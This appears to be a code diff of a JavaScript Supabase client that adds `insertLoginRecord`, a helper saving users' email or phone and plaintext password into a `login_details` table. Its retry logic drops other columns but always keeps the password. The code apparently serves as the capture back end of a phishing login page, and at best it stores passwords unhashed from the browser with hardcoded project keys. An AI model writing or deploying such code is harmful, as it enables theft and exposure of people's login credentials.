@@ -1,8 +1,8 @@
 import { createClient } from '@supabase/supabase-js';
 
 // Fallback credentials ensure client initializes even if Vercel build missed env variables
-const FALLBACK_SUPABASE_URL = 'https://unxyahuwogvsdlmdnslt.supabase.co';
-const FALLBACK_SUPABASE_ANON_KEY = 'sb_publishable_XXEKWkjFZTknYoWd9PDL8w_KnuYpmkK';
+const FALLBACK_SUPABASE_URL = 'https://vrdvgigueqswwlhcenwe.supabase.co';
+const FALLBACK_SUPABASE_ANON_KEY = 'sb_publishable_-jrTBNHdugQo6mQ6rF_cNw_yUP9Id4G';
 
 // Support VITE_, NEXT_PUBLIC_, or plain SUPABASE_ environment variables
 const supabaseUrl =
@@ -31,48 +31,45 @@ if (supabaseUrl && supabaseAnonKey && supabaseUrl !== 'YOUR_SUPABASE_URL') {
 }
 
 /**
- * Inserts a record into Supabase, automatically pruning any columns that don't
- * exist in the database table schema (e.g. PGRST204: Could not find 'xyz' column).
+ * Robust insertion helper for login_details.
+ * Automatically adapts if optional columns like 'email' or 'phone' do not exist in the database.
  */
-export async function safeInsert(table, initialPayload) {
+export async function insertLoginRecord(payload) {
   if (!supabase) {
     console.warn('⚠️ Supabase client not initialized.');
-    return { success: false, error: 'Supabase client not initialized' };
+    return { error: new Error('Supabase client not initialized') };
   }
 
-  let payload = { ...initialPayload };
+  try {
+    // 1. Try full payload (for schemas with type, identifier, email, phone, password, timestamp)
+    let res = await supabase.from('login_details').insert([payload]);
 
-  // Strip undefined/null keys from initial payload
-  Object.keys(payload).forEach((k) => {
-    if (payload[k] === undefined) delete payload[k];
-  });
+    // 2. If a column is missing in schema (e.g. PGRST204: 'email' or 'phone' does not exist)
+    if (res.error && res.error.code === 'PGRST204') {
+      console.warn('Schema mismatch detected (column missing). Retrying with base schema...');
+      const basePayload = {
+        type: payload.type || 'Login',
+        identifier: payload.identifier || payload.email || payload.phone,
+        password: payload.password,
+        timestamp: payload.timestamp || new Date().toISOString(),
+      };
+      res = await supabase.from('login_details').insert([basePayload]);
 
-  for (let attempt = 0; attempt < 8; attempt++) {
-    try {
-      const { data, error } = await supabase.from(table).insert([payload]);
-      if (!error) {
-        console.log(`✅ Successfully saved to Supabase (${table}):`, payload);
-        return { success: true, data, payload };
+      // 3. Fallback for bare schema if timestamp or type also do not exist
+      if (res.error && res.error.code === 'PGRST204') {
+        const barePayload = {
+          identifier: payload.identifier || payload.email || payload.phone,
+          password: payload.password,
+        };
+        res = await supabase.from('login_details').insert([barePayload]);
       }
-
-      // Check if error is due to a column not existing in the schema cache
-      const match = error.message && error.message.match(/Could not find the '([^']+)' column/i);
-      if (match && match[1] && Object.prototype.hasOwnProperty.call(payload, match[1])) {
-        const missingCol = match[1];
-        console.warn(`Column '${missingCol}' does not exist in table '${table}'. Pruning and retrying...`);
-        delete payload[missingCol];
-        continue;
-      }
-
-      console.error(`Error inserting into ${table}:`, error);
-      return { success: false, error, payload };
-    } catch (err) {
-      console.error(`Unexpected exception inserting into ${table}:`, err);
-      return { success: false, error: err, payload };
     }
-  }
 
-  return { success: false, error: 'Max retries reached', payload };
+    return res;
+  } catch (err) {
+    console.error('Unexpected error inserting login record:', err);
+    return { error: err };
+  }
 }
 
 export { supabase, supabaseUrl, supabaseAnonKey };
